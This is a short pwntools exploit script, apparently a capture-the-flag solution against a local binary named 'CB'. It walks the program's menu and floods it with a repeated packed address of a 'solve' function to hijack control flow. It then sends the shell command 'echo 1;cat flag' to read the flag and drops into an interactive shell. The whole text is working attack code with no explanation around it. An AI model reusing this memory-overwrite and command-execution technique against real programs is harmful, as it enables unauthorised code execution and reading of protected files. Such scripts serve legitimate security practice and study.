from pwn import *

context.log_level='debug'
libc = ELF('/lib32/libc.so.6')
s = process('./CB')

'''
gdb-peda$ p solve
$1 = {<text variable, no debug info>} 0x804854b <solve>
'''

solve = 0x804857b#0x804854b

s.recvuntil('print')
s.sendline('8430')
s.recv()
s.sendline('8203')
s.sendline('a')

s.recvuntil('print')
s.sendline('2012')
s.sendline(p32(solve)*100)

s.recv()
s.sendline('8203')
s.sendline("echo 1;cat flag")
s.recvuntil("1\n")
print "flag: "+s.recv(1024)
s.interactive()
